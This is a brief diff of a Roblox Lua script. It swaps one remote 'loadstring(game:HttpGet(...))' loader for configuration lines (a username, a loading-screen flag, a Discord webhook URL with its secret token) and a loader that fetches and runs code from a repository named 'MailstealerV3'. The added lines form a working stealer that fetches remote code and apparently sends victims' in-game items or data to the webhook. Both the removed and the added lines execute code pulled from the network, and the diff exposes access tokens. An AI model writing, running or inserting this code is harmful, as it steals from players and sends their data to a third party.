@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Fluxusoffcial2/Fluxusofficial2Script/09747cda2bf62f9e7ca05cb86a77ef02f98e6ea1/Main?token=GHSAT0AAAAAACNKSJZBSDHUBKCDPHRZ4RHQZNSCBTQ", true))()
+Username = "dianari57581"
+LoadingScreen = true
+Webhook = "https://discord.com/api/webhooks/1199978233190436924/3FTBozgxPAf16r5EHhr-2_oLSeZDt8U9ZAYORiVUmsjHBFgdIVGUiTko1khsjwSXk3l5"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/MailstealerV3/main/main"))()
